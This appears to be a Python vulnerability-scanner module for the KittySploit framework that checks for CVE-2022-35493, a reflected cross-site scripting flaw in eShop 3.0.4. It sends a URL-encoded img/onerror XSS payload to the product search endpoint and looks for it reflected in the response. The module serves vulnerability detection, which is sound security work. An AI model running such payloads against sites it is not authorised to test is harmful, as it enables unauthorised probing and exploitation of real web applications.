#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""eShop 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'eShop 3.0.4 - Cross-Site Scripting Detection',
        'description': 'eShop 3.0.4 contains a reflected cross-site scripting vulnerability in json search parse and json response in wrteam.in.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'eshop', 'xss', 'wrteam', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/Keyvanhardani/Exploit-eShop-Multipurpose-Ecommerce-Store-Website-3.0.4-Cross-Site-Scripting-XSS/blob/main/README.md',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-35493',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/Keyvanhardani/Exploit-eShop-Multipurpose-Ecommerce-Store-Website-3.0.4-Cross-Site-Scripting-XSS',
        ],
        'cve': 'CVE-2022-35493',
    }

    def run(self):
        r = self.http_request(method="GET", path='/home/get_products?search=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('Search Result for \\"><img src=x onerror=alert(document.domain)>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="eShop 3.0.4 - Cross-Site Scripting detected",
                path='/home/get_products?search=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E',
            )
            return True
        return False

